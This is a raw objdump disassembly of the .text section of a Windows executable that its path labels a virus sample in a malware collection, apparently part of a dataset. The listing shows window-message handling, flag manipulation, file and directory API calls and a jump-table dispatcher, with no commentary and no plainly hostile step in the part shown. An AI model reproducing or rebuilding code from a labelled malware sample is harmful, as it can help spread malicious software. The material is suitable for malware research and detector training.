
malware_samples/virus/5fd6a9888f438acb32c7167edf14d09fc205cb12111121fd1a7c27d793d96e43.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	55                   	push   %ebp
  401001:	8b ec                	mov    %esp,%ebp
  401003:	83 ec 5c             	sub    $0x5c,%esp
  401006:	83 7d 0c 0f          	cmpl   $0xf,0xc(%ebp)
  40100a:	74 2b                	je     0x401037
  40100c:	83 7d 0c 46          	cmpl   $0x46,0xc(%ebp)
  401010:	8b 45 14             	mov    0x14(%ebp),%eax
  401013:	75 0d                	jne    0x401022
  401015:	83 48 18 10          	orl    $0x10,0x18(%eax)
  401019:	8b 0d 68 eb 42 00    	mov    0x42eb68,%ecx
  40101f:	89 48 04             	mov    %ecx,0x4(%eax)
  401022:	50                   	push   %eax
  401023:	ff 75 10             	push   0x10(%ebp)
  401026:	ff 75 0c             	push   0xc(%ebp)
  401029:	ff 75 08             	push   0x8(%ebp)
  40102c:	ff 15 48 72 40 00    	call   *0x407248
  401032:	e9 42 01 00 00       	jmp    0x401179
  401037:	53                   	push   %ebx
  401038:	56                   	push   %esi
  401039:	8b 35 70 eb 42 00    	mov    0x42eb70,%esi
  40103f:	8d 45 a4             	lea    -0x5c(%ebp),%eax
  401042:	57                   	push   %edi
  401043:	50                   	push   %eax
  401044:	ff 75 08             	push   0x8(%ebp)
  401047:	ff 15 4c 72 40 00    	call   *0x40724c
  40104d:	83 65 f4 00          	andl   $0x0,-0xc(%ebp)
  401051:	89 45 0c             	mov    %eax,0xc(%ebp)
  401054:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  401057:	50                   	push   %eax
  401058:	ff 75 08             	push   0x8(%ebp)
  40105b:	ff 15 50 72 40 00    	call   *0x407250
  401061:	8b 7d f0             	mov    -0x10(%ebp),%edi
  401064:	83 65 f0 00          	andl   $0x0,-0x10(%ebp)
  401068:	8b 1d 44 70 40 00    	mov    0x407044,%ebx
  40106e:	e9 80 00 00 00       	jmp    0x4010f3
  401073:	0f b6 46 52          	movzbl 0x52(%esi),%eax
  401077:	0f b6 56 56          	movzbl 0x56(%esi),%edx
  40107b:	0f af 55 e8          	imul   -0x18(%ebp),%edx
  40107f:	8b cf                	mov    %edi,%ecx
  401081:	2b 4d e8             	sub    -0x18(%ebp),%ecx
  401084:	0f af c1             	imul   %ecx,%eax
  401087:	03 c2                	add    %edx,%eax
  401089:	89 4d 10             	mov    %ecx,0x10(%ebp)
  40108c:	99                   	cltd
  40108d:	f7 ff                	idiv   %edi
  40108f:	33 d2                	xor    %edx,%edx
  401091:	8a f0                	mov    %al,%dh
  401093:	0f b6 46 51          	movzbl 0x51(%esi),%eax
  401097:	0f af c1             	imul   %ecx,%eax
  40109a:	0f b6 4e 55          	movzbl 0x55(%esi),%ecx
  40109e:	0f af 4d e8          	imul   -0x18(%ebp),%ecx
  4010a2:	03 c1                	add    %ecx,%eax
  4010a4:	8b ca                	mov    %edx,%ecx
  4010a6:	99                   	cltd
  4010a7:	f7 ff                	idiv   %edi
  4010a9:	0f b6 56 54          	movzbl 0x54(%esi),%edx
  4010ad:	0f af 55 e8          	imul   -0x18(%ebp),%edx
  4010b1:	8a c8                	mov    %al,%cl
  4010b3:	0f b6 46 50          	movzbl 0x50(%esi),%eax
  4010b7:	0f af 45 10          	imul   0x10(%ebp),%eax
  4010bb:	03 c2                	add    %edx,%eax
  4010bd:	99                   	cltd
  4010be:	f7 ff                	idiv   %edi
  4010c0:	c1 e1 08             	shl    $0x8,%ecx
  4010c3:	0f b6 c0             	movzbl %al,%eax
  4010c6:	0b c8                	or     %eax,%ecx
  4010c8:	8d 45 f4             	lea    -0xc(%ebp),%eax
  4010cb:	50                   	push   %eax
  4010cc:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  4010cf:	ff 15 48 70 40 00    	call   *0x407048
  4010d5:	83 45 f0 04          	addl   $0x4,-0x10(%ebp)
  4010d9:	89 45 14             	mov    %eax,0x14(%ebp)
  4010dc:	50                   	push   %eax
  4010dd:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  4010e0:	50                   	push   %eax
  4010e1:	ff 75 0c             	push   0xc(%ebp)
  4010e4:	ff 15 54 72 40 00    	call   *0x407254
  4010ea:	ff 75 14             	push   0x14(%ebp)
  4010ed:	ff d3                	call   *%ebx
  4010ef:	83 45 e8 04          	addl   $0x4,-0x18(%ebp)
  4010f3:	39 7d e8             	cmp    %edi,-0x18(%ebp)
  4010f6:	0f 8c 77 ff ff ff    	jl     0x401073
  4010fc:	83 7e 58 ff          	cmpl   $0xffffffff,0x58(%esi)
  401100:	74 65                	je     0x401167
  401102:	ff 76 34             	push   0x34(%esi)
  401105:	ff 15 4c 70 40 00    	call   *0x40704c
  40110b:	85 c0                	test   %eax,%eax
  40110d:	89 45 14             	mov    %eax,0x14(%ebp)
  401110:	74 55                	je     0x401167
  401112:	8b 7d 0c             	mov    0xc(%ebp),%edi
  401115:	6a 01                	push   $0x1
  401117:	57                   	push   %edi
  401118:	c7 45 e4 10 00 00 00 	movl   $0x10,-0x1c(%ebp)
  40111f:	c7 45 e8 08 00 00 00 	movl   $0x8,-0x18(%ebp)
  401126:	ff 15 50 70 40 00    	call   *0x407050
  40112c:	ff 76 58             	push   0x58(%esi)
  40112f:	57                   	push   %edi
  401130:	ff 15 54 70 40 00    	call   *0x407054
  401136:	ff 75 14             	push   0x14(%ebp)
  401139:	8b 35 58 70 40 00    	mov    0x407058,%esi
  40113f:	57                   	push   %edi
  401140:	ff d6                	call   *%esi
  401142:	89 45 0c             	mov    %eax,0xc(%ebp)
  401145:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  401148:	68 20 08 00 00       	push   $0x820
  40114d:	50                   	push   %eax
  40114e:	6a ff                	push   $0xffffffff
  401150:	68 60 e3 42 00       	push   $0x42e360
  401155:	57                   	push   %edi
  401156:	ff 15 58 72 40 00    	call   *0x407258
  40115c:	ff 75 0c             	push   0xc(%ebp)
  40115f:	57                   	push   %edi
  401160:	ff d6                	call   *%esi
  401162:	ff 75 14             	push   0x14(%ebp)
  401165:	ff d3                	call   *%ebx
  401167:	8d 45 a4             	lea    -0x5c(%ebp),%eax
  40116a:	50                   	push   %eax
  40116b:	ff 75 08             	push   0x8(%ebp)
  40116e:	ff 15 5c 72 40 00    	call   *0x40725c
  401174:	5f                   	pop    %edi
  401175:	5e                   	pop    %esi
  401176:	33 c0                	xor    %eax,%eax
  401178:	5b                   	pop    %ebx
  401179:	c9                   	leave
  40117a:	c2 10 00             	ret    $0x10
  40117d:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  401181:	a1 88 eb 42 00       	mov    0x42eb88,%eax
  401186:	8b d1                	mov    %ecx,%edx
  401188:	53                   	push   %ebx
  401189:	69 d2 18 04 00 00    	imul   $0x418,%edx,%edx
  40118f:	56                   	push   %esi
  401190:	57                   	push   %edi
  401191:	8b 54 02 08          	mov    0x8(%edx,%eax,1),%edx
  401195:	f6 c2 02             	test   $0x2,%dl
  401198:	74 4f                	je     0x4011e9
  40119a:	8d 71 01             	lea    0x1(%ecx),%esi
  40119d:	33 ff                	xor    %edi,%edi
  40119f:	3b 35 8c eb 42 00    	cmp    0x42eb8c,%esi
  4011a5:	73 42                	jae    0x4011e9
  4011a7:	8b ce                	mov    %esi,%ecx
  4011a9:	69 c9 18 04 00 00    	imul   $0x418,%ecx,%ecx
  4011af:	8d 44 01 08          	lea    0x8(%ecx,%eax,1),%eax
  4011b3:	8b 08                	mov    (%eax),%ecx
  4011b5:	f6 c1 02             	test   $0x2,%cl
  4011b8:	74 03                	je     0x4011bd
  4011ba:	47                   	inc    %edi
  4011bb:	eb 1e                	jmp    0x4011db
  4011bd:	f6 c1 04             	test   $0x4,%cl
  4011c0:	74 09                	je     0x4011cb
  4011c2:	8b cf                	mov    %edi,%ecx
  4011c4:	4f                   	dec    %edi
  4011c5:	85 c9                	test   %ecx,%ecx
  4011c7:	74 20                	je     0x4011e9
  4011c9:	eb 10                	jmp    0x4011db
  4011cb:	f6 c1 10             	test   $0x10,%cl
  4011ce:	75 0b                	jne    0x4011db
  4011d0:	8b d9                	mov    %ecx,%ebx
  4011d2:	33 da                	xor    %edx,%ebx
  4011d4:	83 e3 01             	and    $0x1,%ebx
  4011d7:	33 d9                	xor    %ecx,%ebx
  4011d9:	89 18                	mov    %ebx,(%eax)
  4011db:	46                   	inc    %esi
  4011dc:	05 18 04 00 00       	add    $0x418,%eax
  4011e1:	3b 35 8c eb 42 00    	cmp    0x42eb8c,%esi
  4011e7:	72 ca                	jb     0x4011b3
  4011e9:	5f                   	pop    %edi
  4011ea:	5e                   	pop    %esi
  4011eb:	5b                   	pop    %ebx
  4011ec:	c2 04 00             	ret    $0x4
  4011ef:	55                   	push   %ebp
  4011f0:	8b ec                	mov    %esp,%ebp
  4011f2:	51                   	push   %ecx
  4011f3:	51                   	push   %ecx
  4011f4:	8b 55 08             	mov    0x8(%ebp),%edx
  4011f7:	53                   	push   %ebx
  4011f8:	56                   	push   %esi
  4011f9:	8b f2                	mov    %edx,%esi
  4011fb:	69 f6 18 04 00 00    	imul   $0x418,%esi,%esi
  401201:	8b 1d 88 eb 42 00    	mov    0x42eb88,%ebx
  401207:	33 c9                	xor    %ecx,%ecx
  401209:	03 f3                	add    %ebx,%esi
  40120b:	57                   	push   %edi
  40120c:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  40120f:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  401212:	8b 46 08             	mov    0x8(%esi),%eax
  401215:	a8 02                	test   $0x2,%al
  401217:	74 0b                	je     0x401224
  401219:	39 4d 0c             	cmp    %ecx,0xc(%ebp)
  40121c:	74 06                	je     0x401224
  40121e:	24 be                	and    $0xbe,%al
  401220:	42                   	inc    %edx
  401221:	89 46 08             	mov    %eax,0x8(%esi)
  401224:	3b 15 8c eb 42 00    	cmp    0x42eb8c,%edx
  40122a:	73 44                	jae    0x401270
  40122c:	8b c2                	mov    %edx,%eax
  40122e:	69 c0 18 04 00 00    	imul   $0x418,%eax,%eax
  401234:	8d 7c 18 08          	lea    0x8(%eax,%ebx,1),%edi
  401238:	8d 42 01             	lea    0x1(%edx),%eax
  40123b:	8b 0f                	mov    (%edi),%ecx
  40123d:	f6 c1 02             	test   $0x2,%cl
  401240:	74 0a                	je     0x40124c
  401242:	6a 01                	push   $0x1
  401244:	52                   	push   %edx
  401245:	e8 a5 ff ff ff       	call   0x4011ef
  40124a:	8b 0f                	mov    (%edi),%ecx
  40124c:	f6 c1 04             	test   $0x4,%cl
  40124f:	75 28                	jne    0x401279
  401251:	f6 c1 40             	test   $0x40,%cl
  401254:	74 03                	je     0x401259
  401256:	ff 45 fc             	incl   -0x4(%ebp)
  401259:	f6 c1 01             	test   $0x1,%cl
  40125c:	74 05                	je     0x401263
  40125e:	ff 45 fc             	incl   -0x4(%ebp)
  401261:	eb 03                	jmp    0x401266
  401263:	ff 45 f8             	incl   -0x8(%ebp)
  401266:	3b 05 8c eb 42 00    	cmp    0x42eb8c,%eax
  40126c:	8b d0                	mov    %eax,%edx
  40126e:	72 bc                	jb     0x40122c
  401270:	33 c0                	xor    %eax,%eax
  401272:	5f                   	pop    %edi
  401273:	5e                   	pop    %esi
  401274:	5b                   	pop    %ebx
  401275:	c9                   	leave
  401276:	c2 08 00             	ret    $0x8
  401279:	83 7d fc 00          	cmpl   $0x0,-0x4(%ebp)
  40127d:	74 f3                	je     0x401272
  40127f:	83 7d f8 00          	cmpl   $0x0,-0x8(%ebp)
  401283:	74 06                	je     0x40128b
  401285:	83 4e 08 40          	orl    $0x40,0x8(%esi)
  401289:	eb e7                	jmp    0x401272
  40128b:	8b 4e 08             	mov    0x8(%esi),%ecx
  40128e:	80 e1 7f             	and    $0x7f,%cl
  401291:	83 c9 01             	or     $0x1,%ecx
  401294:	89 4e 08             	mov    %ecx,0x8(%esi)
  401297:	eb d9                	jmp    0x401272
  401299:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  40129d:	a1 88 eb 42 00       	mov    0x42eb88,%eax
  4012a2:	56                   	push   %esi
  4012a3:	33 f6                	xor    %esi,%esi
  4012a5:	83 f9 20             	cmp    $0x20,%ecx
  4012a8:	73 34                	jae    0x4012de
  4012aa:	39 35 8c eb 42 00    	cmp    %esi,0x42eb8c
  4012b0:	76 2c                	jbe    0x4012de
  4012b2:	8d 50 08             	lea    0x8(%eax),%edx
  4012b5:	57                   	push   %edi
  4012b6:	8b 02                	mov    (%edx),%eax
  4012b8:	a8 06                	test   $0x6,%al
  4012ba:	75 12                	jne    0x4012ce
  4012bc:	33 ff                	xor    %edi,%edi
  4012be:	47                   	inc    %edi
  4012bf:	d3 e7                	shl    %cl,%edi
  4012c1:	85 7a fc             	test   %edi,-0x4(%edx)
  4012c4:	74 04                	je     0x4012ca
  4012c6:	0c 01                	or     $0x1,%al
  4012c8:	eb 02                	jmp    0x4012cc
  4012ca:	24 fe                	and    $0xfe,%al
  4012cc:	89 02                	mov    %eax,(%edx)
  4012ce:	46                   	inc    %esi
  4012cf:	81 c2 18 04 00 00    	add    $0x418,%edx
  4012d5:	3b 35 8c eb 42 00    	cmp    0x42eb8c,%esi
  4012db:	72 d9                	jb     0x4012b6
  4012dd:	5f                   	pop    %edi
  4012de:	5e                   	pop    %esi
  4012df:	c2 04 00             	ret    $0x4
  4012e2:	55                   	push   %ebp
  4012e3:	8b ec                	mov    %esp,%ebp
  4012e5:	83 ec 0c             	sub    $0xc,%esp
  4012e8:	a1 70 eb 42 00       	mov    0x42eb70,%eax
  4012ed:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  4012f1:	53                   	push   %ebx
  4012f2:	56                   	push   %esi
  4012f3:	05 94 00 00 00       	add    $0x94,%eax
  4012f8:	57                   	push   %edi
  4012f9:	8b 3d 8c eb 42 00    	mov    0x42eb8c,%edi
  4012ff:	89 45 f8             	mov    %eax,-0x8(%ebp)
  401302:	8b 45 f8             	mov    -0x8(%ebp),%eax
  401305:	33 db                	xor    %ebx,%ebx
  401307:	39 18                	cmp    %ebx,(%eax)
  401309:	74 4b                	je     0x401356
  40130b:	3b df                	cmp    %edi,%ebx
  40130d:	73 45                	jae    0x401354
  40130f:	8b 35 88 eb 42 00    	mov    0x42eb88,%esi
  401315:	83 c6 08             	add    $0x8,%esi
  401318:	8b 16                	mov    (%esi),%edx
  40131a:	f6 c2 06             	test   $0x6,%dl
  40131d:	75 28                	jne    0x401347
  40131f:	8b 45 08             	mov    0x8(%ebp),%eax
  401322:	85 c0                	test   %eax,%eax
  401324:	74 06                	je     0x40132c
  401326:	83 3c 98 00          	cmpl   $0x0,(%eax,%ebx,4)
  40132a:	74 1b                	je     0x401347
  40132c:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40132f:	33 c0                	xor    %eax,%eax
  401331:	40                   	inc    %eax
  401332:	83 e2 01             	and    $0x1,%edx
  401335:	d3 e0                	shl    %cl,%eax
  401337:	8b 4e fc             	mov    -0x4(%esi),%ecx
  40133a:	23 c8                	and    %eax,%ecx
  40133c:	8b c1                	mov    %ecx,%eax
  40133e:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  401341:	d3 e2                	shl    %cl,%edx
  401343:	3b c2                	cmp    %edx,%eax
  401345:	75 0b                	jne    0x401352
  401347:	43                   	inc    %ebx
  401348:	81 c6 18 04 00 00    	add    $0x418,%esi
  40134e:	3b df                	cmp    %edi,%ebx
  401350:	72 c6                	jb     0x401318
  401352:	3b df                	cmp    %edi,%ebx
  401354:	74 0d                	je     0x401363
  401356:	ff 45 fc             	incl   -0x4(%ebp)
  401359:	83 45 f8 04          	addl   $0x4,-0x8(%ebp)
  40135d:	83 7d fc 20          	cmpl   $0x20,-0x4(%ebp)
  401361:	72 9f                	jb     0x401302
  401363:	8b 45 fc             	mov    -0x4(%ebp),%eax
  401366:	5f                   	pop    %edi
  401367:	5e                   	pop    %esi
  401368:	5b                   	pop    %ebx
  401369:	c9                   	leave
  40136a:	c2 04 00             	ret    $0x4
  40136d:	8b 44 24 04          	mov    0x4(%esp),%eax
  401371:	85 c0                	test   %eax,%eax
  401373:	7d 11                	jge    0x401386
  401375:	40                   	inc    %eax
  401376:	b9 00 f0 42 00       	mov    $0x42f000,%ecx
  40137b:	c1 e0 0a             	shl    $0xa,%eax
  40137e:	2b c8                	sub    %eax,%ecx
  401380:	51                   	push   %ecx
  401381:	e8 fd 45 00 00       	call   0x405983
  401386:	c2 04 00             	ret    $0x4
  401389:	56                   	push   %esi
  40138a:	8b 74 24 08          	mov    0x8(%esp),%esi
  40138e:	eb 6a                	jmp    0x4013fa
  401390:	8b c6                	mov    %esi,%eax
  401392:	8b 0d 90 eb 42 00    	mov    0x42eb90,%ecx
  401398:	6b c0 1c             	imul   $0x1c,%eax,%eax
  40139b:	03 c1                	add    %ecx,%eax
  40139d:	83 38 01             	cmpl   $0x1,(%eax)
  4013a0:	74 5c                	je     0x4013fe
  4013a2:	50                   	push   %eax
  4013a3:	e8 8c 00 00 00       	call   0x401434
  4013a8:	3d ff ff ff 7f       	cmp    $0x7fffffff,%eax
  4013ad:	74 55                	je     0x401404
  4013af:	50                   	push   %eax
  4013b0:	e8 b8 ff ff ff       	call   0x40136d
  4013b5:	85 c0                	test   %eax,%eax
  4013b7:	75 04                	jne    0x4013bd
  4013b9:	40                   	inc    %eax
  4013ba:	46                   	inc    %esi
  4013bb:	eb 07                	jmp    0x4013c4
  4013bd:	48                   	dec    %eax
  4013be:	8b ce                	mov    %esi,%ecx
  4013c0:	8b f0                	mov    %eax,%esi
  4013c2:	2b c1                	sub    %ecx,%eax
  4013c4:	83 7c 24 0c 00       	cmpl   $0x0,0xc(%esp)
  4013c9:	74 2f                	je     0x4013fa
  4013cb:	01 05 4c e3 42 00    	add    %eax,0x42e34c
  4013d1:	6a 00                	push   $0x0
  4013d3:	ff 35 34 e3 42 00    	push   0x42e334
  4013d9:	68 30 75 00 00       	push   $0x7530
  4013de:	ff 35 4c e3 42 00    	push   0x42e34c
  4013e4:	ff 15 30 71 40 00    	call   *0x407130
  4013ea:	50                   	push   %eax
  4013eb:	68 02 04 00 00       	push   $0x402
  4013f0:	ff 74 24 18          	push   0x18(%esp)
  4013f4:	ff 15 44 72 40 00    	call   *0x407244
  4013fa:	85 f6                	test   %esi,%esi
  4013fc:	7d 92                	jge    0x401390
  4013fe:	33 c0                	xor    %eax,%eax
  401400:	5e                   	pop    %esi
  401401:	c2 08 00             	ret    $0x8
  401404:	b8 ff ff ff 7f       	mov    $0x7fffffff,%eax
  401409:	eb f5                	jmp    0x401400
  40140b:	8b 44 24 04          	mov    0x4(%esp),%eax
  40140f:	8b 0d 70 eb 42 00    	mov    0x42eb70,%ecx
  401415:	6a 00                	push   $0x0
  401417:	ff 74 81 6c          	push   0x6c(%ecx,%eax,4)
  40141b:	e8 69 ff ff ff       	call   0x401389
  401420:	c2 04 00             	ret    $0x4
  401423:	68 80 9f 40 00       	push   $0x409f80
  401428:	ff 74 24 08          	push   0x8(%esp)
  40142c:	e8 79 39 00 00       	call   0x404daa
  401431:	c2 04 00             	ret    $0x4
  401434:	55                   	push   %ebp
  401435:	8b ec                	mov    %esp,%ebp
  401437:	81 ec a4 01 00 00    	sub    $0x1a4,%esp
  40143d:	a1 68 eb 42 00       	mov    0x42eb68,%eax
  401442:	53                   	push   %ebx
  401443:	56                   	push   %esi
  401444:	8b 75 08             	mov    0x8(%ebp),%esi
  401447:	57                   	push   %edi
  401448:	6a 07                	push   $0x7
  40144a:	59                   	pop    %ecx
  40144b:	8d 7d d8             	lea    -0x28(%ebp),%edi
  40144e:	89 45 cc             	mov    %eax,-0x34(%ebp)
  401451:	33 db                	xor    %ebx,%ebx
  401453:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  401455:	8b 45 dc             	mov    -0x24(%ebp),%eax
  401458:	8b 55 e0             	mov    -0x20(%ebp),%edx
  40145b:	8b f0                	mov    %eax,%esi
  40145d:	8b fa                	mov    %edx,%edi
  40145f:	c1 e6 0a             	shl    $0xa,%esi
  401462:	b9 00 f0 42 00       	mov    $0x42f000,%ecx
  401467:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  40146a:	c1 e7 0a             	shl    $0xa,%edi
  40146d:	03 f1                	add    %ecx,%esi
  40146f:	03 f9                	add    %ecx,%edi
  401471:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  401474:	89 0d 78 9b 40 00    	mov    %ecx,0x409b78
  40147a:	8b 4d d8             	mov    -0x28(%ebp),%ecx
  40147d:	83 c1 fe             	add    $0xfffffffe,%ecx
  401480:	83 f9 41             	cmp    $0x41,%ecx
  401483:	0f 87 02 14 00 00    	ja     0x40288b
  401489:	ff 24 8d 9d 28 40 00 	jmp    *0x40289d(,%ecx,4)
  401490:	53                   	push   %ebx
  401491:	50                   	push   %eax
  401492:	e8 13 39 00 00       	call   0x404daa
  401497:	e9 72 0d 00 00       	jmp    0x40220e
  40149c:	ff 05 2c e3 42 00    	incl   0x42e32c
  4014a2:	39 5d cc             	cmp    %ebx,-0x34(%ebp)
  4014a5:	0f 84 63 0d 00 00    	je     0x40220e
  4014ab:	53                   	push   %ebx
  4014ac:	ff 15 f8 71 40 00    	call   *0x4071f8
  4014b2:	e9 57 0d 00 00       	jmp    0x40220e
  4014b7:	50                   	push   %eax
  4014b8:	e8 b0 fe ff ff       	call   0x40136d
  4014bd:	48                   	dec    %eax
  4014be:	53                   	push   %ebx
  4014bf:	50                   	push   %eax
  4014c0:	e8 c4 fe ff ff       	call   0x401389
  4014c5:	e9 cc 13 00 00       	jmp    0x402896
  4014ca:	53                   	push   %ebx
  4014cb:	50                   	push   %eax
  4014cc:	e8 d9 38 00 00       	call   0x404daa
  4014d1:	e9 b5 13 00 00       	jmp    0x40288b
  4014d6:	53                   	push   %ebx
  4014d7:	e8 fd 14 00 00       	call   0x4029d9
  4014dc:	83 f8 01             	cmp    $0x1,%eax
  4014df:	7f 03                	jg     0x4014e4
  4014e1:	33 c0                	xor    %eax,%eax
  4014e3:	40                   	inc    %eax
  4014e4:	50                   	push   %eax
  4014e5:	ff 15 88 70 40 00    	call   *0x407088
  4014eb:	e9 9b 13 00 00       	jmp    0x40288b
  4014f0:	ff 75 cc             	push   -0x34(%ebp)
  4014f3:	ff 15 fc 71 40 00    	call   *0x4071fc
  4014f9:	e9 8d 13 00 00       	jmp    0x40288b
  4014fe:	c1 e0 02             	shl    $0x2,%eax
  401501:	39 5d e4             	cmp    %ebx,-0x1c(%ebp)
  401504:	75 22                	jne    0x401528
  401506:	8b 88 e0 eb 42 00    	mov    0x42ebe0(%eax),%ecx
  40150c:	6a 01                	push   $0x1
  40150e:	89 88 20 ec 42 00    	mov    %ecx,0x42ec20(%eax)
  401514:	e8 c0 14 00 00       	call   0x4029d9
  401519:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  40151c:	89 04 8d e0 eb 42 00 	mov    %eax,0x42ebe0(,%ecx,4)
  401523:	e9 63 13 00 00       	jmp    0x40288b
  401528:	8b 88 20 ec 42 00    	mov    0x42ec20(%eax),%ecx
  40152e:	89 88 e0 eb 42 00    	mov    %ecx,0x42ebe0(%eax)
  401534:	e9 52 13 00 00       	jmp    0x40288b
  401539:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  40153c:	8d 34 85 e0 eb 42 00 	lea    0x42ebe0(,%eax,4),%esi
  401543:	33 c0                	xor    %eax,%eax
  401545:	8b 0e                	mov    (%esi),%ecx
  401547:	3b cb                	cmp    %ebx,%ecx
  401549:	0f 94 c0             	sete   %al
  40154c:	23 4d e8             	and    -0x18(%ebp),%ecx
  40154f:	8b 44 85 dc          	mov    -0x24(%ebp,%eax,4),%eax
  401553:	89 0e                	mov    %ecx,(%esi)
  401555:	e9 3c 13 00 00       	jmp    0x402896
  40155a:	ff 34 95 e0 eb 42 00 	push   0x42ebe0(,%edx,4)
  401561:	56                   	push   %esi
  401562:	e9 cc 12 00 00       	jmp    0x402833
  401567:	8b 0d 30 e3 42 00    	mov    0x42e330,%ecx
  40156d:	8b 35 60 72 40 00    	mov    0x407260,%esi
  401573:	3b cb                	cmp    %ebx,%ecx
  401575:	74 07                	je     0x40157e
  401577:	52                   	push   %edx
  401578:	51                   	push   %ecx
  401579:	ff d6                	call   *%esi
  40157b:	8b 45 dc             	mov    -0x24(%ebp),%eax
  40157e:	8b 0d 44 e3 42 00    	mov    0x42e344,%ecx
  401584:	3b cb                	cmp    %ebx,%ecx
  401586:	0f 84 ff 12 00 00    	je     0x40288b
  40158c:	50                   	push   %eax
  40158d:	51                   	push   %ecx
  40158e:	ff d6                	call   *%esi
  401590:	e9 f6 12 00 00       	jmp    0x40288b
  401595:	6a f0                	push   $0xfffffff0
  401597:	e8 5a 14 00 00       	call   0x4029f6
  40159c:	ff 75 e0             	push   -0x20(%ebp)
  40159f:	50                   	push   %eax
  4015a0:	ff 15 84 70 40 00    	call   *0x407084
  4015a6:	85 c0                	test   %eax,%eax
  4015a8:	0f 85 dd 12 00 00    	jne    0x40288b
  4015ae:	e9 a9 10 00 00       	jmp    0x40265c
  4015b3:	6a f0                	push   $0xfffffff0
  4015b5:	e8 3c 14 00 00       	call   0x4029f6
  4015ba:	8b f8                	mov    %eax,%edi
  4015bc:	57                   	push   %edi
  4015bd:	e8 d1 3f 00 00       	call   0x405593
  4015c2:	8b f0                	mov    %eax,%esi
  4015c4:	3b f3                	cmp    %ebx,%esi
  4015c6:	74 42                	je     0x40160a
  4015c8:	6a 5c                	push   $0x5c
  4015ca:	56                   	push   %esi
  4015cb:	e8 5a 3f 00 00       	call   0x40552a
  4015d0:	8b f0                	mov    %eax,%esi
  4015d2:	53                   	push   %ebx
  4015d3:	57                   	push   %edi
  4015d4:	8a 06                	mov    (%esi),%al
  4015d6:	88 1e                	mov    %bl,(%esi)
  4015d8:	88 45 0b             	mov    %al,0xb(%ebp)
  4015db:	ff 15 80 70 40 00    	call   *0x407080
  4015e1:	85 c0                	test   %eax,%eax
  4015e3:	75 1b                	jne    0x401600
  4015e5:	ff 15 7c 70 40 00    	call   *0x40707c
  4015eb:	3d b7 00 00 00       	cmp    $0xb7,%eax
  4015f0:	75 0b                	jne    0x4015fd
  4015f2:	57                   	push   %edi
  4015f3:	ff 15 78 70 40 00    	call   *0x407078
  4015f9:	a8 10                	test   $0x10,%al
  4015fb:	75 03                	jne    0x401600
  4015fd:	ff 45 fc             	incl   -0x4(%ebp)
  401600:	8a 45 0b             	mov    0xb(%ebp),%al
  401603:	88 06                	mov    %al,(%esi)
  401605:	46                   	inc    %esi
  401606:	3a c3                	cmp    %bl,%al
  401608:	75 be                	jne    0x4015c8
  40160a:	39 5d e0             	cmp    %ebx,-0x20(%ebp)
  40160d:	74 1e                	je     0x40162d
  40160f:	6a e6                	push   $0xffffffe6
  401611:	e8 0d fe ff ff       	call   0x401423
  401616:	57                   	push   %edi
  401617:	68 00 48 43 00       	push   $0x434800
  40161c:	e8 eb 43 00 00       	call   0x405a0c
  401621:	57                   	push   %edi
  401622:	ff 15 74 70 40 00    	call   *0x407074
  401628:	e9 5e 12 00 00       	jmp    0x40288b
  40162d:	6a f5                	push   $0xfffffff5
  40162f:	e9 30 0b 00 00       	jmp    0x402164
  401634:	53                   	push   %ebx
  401635:	e8 bc 13 00 00       	call   0x4029f6
  40163a:	50                   	push   %eax
  40163b:	e8 c7 46 00 00       	call   0x405d07
  401640:	e9 35 06 00 00       	jmp    0x401c7a
  401645:	6a d0                	push   $0xffffffd0
  401647:	e8 aa 13 00 00       	call   0x4029f6
  40164c:	6a df                	push   $0xffffffdf
  40164e:	8b f0                	mov    %eax,%esi
  401650:	e8 a1 13 00 00       	call   0x4029f6
  401655:	6a 13                	push   $0x13
  401657:	8b f8                	mov    %eax,%edi
  401659:	e8 98 13 00 00       	call   0x4029f6
  40165e:	57                   	push   %edi
  40165f:	56                   	push   %esi
  401660:	ff 15 70 70 40 00    	call   *0x407070
  401666:	85 c0                	test   %eax,%eax
  401668:	74 07                	je     0x401671
  40166a:	6a e3                	push   $0xffffffe3
  40166c:	e9 f3 0a 00 00       	jmp    0x402164
  401671:	39 5d e4             	cmp    %ebx,-0x1c(%ebp)
  401674:	0f 84 e2 0f 00 00    	je     0x40265c
  40167a:	56                   	push   %esi
  40167b:	e8 87 46 00 00       	call   0x405d07
  401680:	85 c0                	test   %eax,%eax
  401682:	0f 84 d4 0f 00 00    	je     0x40265c
  401688:	57                   	push   %edi
  401689:	56                   	push   %esi
  40168a:	e8 cb 40 00 00       	call   0x40575a
  40168f:	6a e4                	push   $0xffffffe4
  401691:	e9 ce 0a 00 00       	jmp    0x402164
  401696:	53                   	push   %ebx
  401697:	e8 5a 13 00 00       	call   0x4029f6
  40169c:	8b f0                	mov    %eax,%esi
  40169e:	8d 45 08             	lea    0x8(%ebp),%eax
  4016a1:	50                   	push   %eax
  4016a2:	57                   	push   %edi
  4016a3:	68 00 04 00 00       	push   $0x400
  4016a8:	56                   	push   %esi
  4016a9:	ff 15 6c 70 40 00    	call   *0x40706c
  4016af:	85 c0                	test   %eax,%eax
  4016b1:	74 23                	je     0x4016d6
  4016b3:	8b 45 08             	mov    0x8(%ebp),%eax
  4016b6:	3b c6                	cmp    %esi,%eax
  4016b8:	76 25                	jbe    0x4016df
  4016ba:	38 18                	cmp    %bl,(%eax)
  4016bc:	74 21                	je     0x4016df
  4016be:	56                   	push   %esi
  4016bf:	e8 43 46 00 00       	call   0x405d07
  4016c4:	3b c3                	cmp    %ebx,%eax
  4016c6:	74 0e                	je     0x4016d6
  4016c8:	83 c0 2c             	add    $0x2c,%eax
  4016cb:	50                   	push   %eax
  4016cc:	ff 75 08             	push   0x8(%ebp)
